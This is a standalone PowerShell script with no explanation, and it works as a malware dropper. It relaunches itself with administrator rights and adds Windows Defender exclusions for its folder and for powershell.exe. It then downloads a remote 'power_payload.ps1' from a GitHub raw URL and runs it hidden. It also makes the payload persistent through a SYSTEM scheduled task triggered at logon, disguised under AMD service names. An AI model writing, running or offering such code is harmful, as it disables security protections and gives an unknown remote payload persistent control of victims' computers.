if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"" -Verb RunAs
    exit
}

$TargetDir = "$env:LOCALAPPDATA\AMD_Service"
$Path = "$TargetDir\AMD_Service_Task.ps1"
$PayloadUrl = "https://raw.githubusercontent.com/powderedLamb40/Script-pp/refs/heads/main/power_payload.ps1"

if (!(Test-Path $TargetDir)) { New-Item -Path $TargetDir -ItemType Directory -Force }
Add-MpPreference -ExclusionPath $TargetDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue

(New-Object Net.WebClient).DownloadFile($PayloadUrl, $Path)

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName "AMDRyzenUpdateService" -Force

Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path""
